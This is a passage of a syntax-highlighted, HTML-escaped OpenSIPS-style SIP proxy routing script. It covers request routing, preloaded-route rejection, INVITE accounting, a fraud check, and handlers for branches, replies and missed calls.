&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;t_check_trans&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			t_relay&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	t_check_trans&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; !&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;from_uri&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;myself&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# if caller is not local, then called number must be local&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# preloaded route checking&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;loose_route&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;L_ERR&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Attempt to route with preloaded Route&amp;#39;s [&lt;/span&gt;$fu&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$tu&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$ru&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$ci&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ACK&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;403&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Preload Route denied&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# record routing&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER|MESSAGE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		record_route&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# account only INVITEs&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;INVITE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		create_dialog&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		do_accounting&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;evi&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cdr|missed|failed&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!uri&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;myself&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		append_hf&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;P-hint: outbound\r\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;relay&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# requests for my domain&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PUBLISH|SUBSCRIBE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;503&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Service Unavailable&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$rU&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;NULL&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# request with no Username in RURI&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;484&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Address Incomplete&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!check_fraud&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$fU&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$rU&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;403&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Forbidden&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$du &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sip:10.0.2.8:7050&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;relay&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;relay&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# for INVITEs enable some additional helper routes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;INVITE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_on_branch&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;per_branch_ops&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_on_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;handle_nat&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_on_failure&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;missed_call&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!t_relay&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;500&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Internal Error&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;branch_route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;per_branch_ops&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;new branch at &lt;/span&gt;$ru&lt;span style=&#34;color:#e6db74&#34;&gt;\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;onreply_route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;handle_nat&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;incoming reply\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;ds_route&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;foo\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;failure_route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;missed_call&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;t_was_cancelled&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# uncomment the following lines if you want to block client &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# redirect based on 3xx replies.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;##if (t_check_status(&amp;#34;3[0-9][0-9]&amp;#34;)) {&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;##t_reply(&amp;#34;404&amp;#34;,&amp;#34;Not found&amp;#34;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;##	exit;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;##}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;event_route &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;E_FRD_WARNING&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	fetch_event_params&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(param);&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(val);&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(thr);&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(user);&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(number);&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(ruleid)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
